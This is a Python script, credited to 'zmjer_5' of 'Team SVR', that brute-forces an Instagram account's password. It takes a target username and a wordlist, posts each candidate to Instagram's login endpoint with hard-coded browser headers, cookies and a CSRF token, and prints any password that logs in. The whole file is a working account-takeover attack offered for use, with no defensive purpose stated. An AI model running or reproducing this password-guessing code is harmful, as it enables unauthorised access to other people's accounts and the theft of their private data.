import time
import requests
import os
# Color snippets
black="\033[0;30m"
redd="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"
os.system("clear")
print(f"""
{yellow}Team:{bgreen}SVR            {yellow}by:{bgreen}zmjer_5     
{yellow}my instagram:{bgreen}zmjer_5""")
user = input(bred+"[+] Enter user name target: ")
a = input(bred + "[+] Enter your password list: ")
file = open(f'{a}').read().splitlines() 
for end in file:
    time.sleep(3)
    url = 'https://www.instagram.com/accounts/login/ajax/'
    head = {'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
            'content-length': '326',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YVvhbgALAAGEYIx5zhMwH4bDBV45; ig_did=648907BC-0061-4C67-AFF5-C72FAA705508; ig_nrcb=1; rur="LDC\05451296553316\0541675250058:01f73352f31122060f419a1c03ef57b01f1db6d027546e0dce91569f7ba529abb34ba7de"; csrftoken=nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
            'x-asbd-id': '198387',
            'x-csrftoken': 'nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR3VqP_m-krwiZnt3-dga6AdX4Ci5cwQwDhvGD_6DT0IRX8c',
            'x-instagram-ajax': 'ee0117db2fab',
            'x-requested-with': 'XMLHttpRequest'}

    data = {
        'username': user,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + end
    }
    r = requests.post(url, headers=head, data=data).text
    if ('"authenticated":true') in r:
        print(green +f'[+] found password: {end}')
    elif ('"authenticated":false') in r:
        print(redd + f'[+] not found password: {end}')
    elif ('"massage": "checkpoint_required"') in r:
        print(f'[+] user name is secure > {user}')
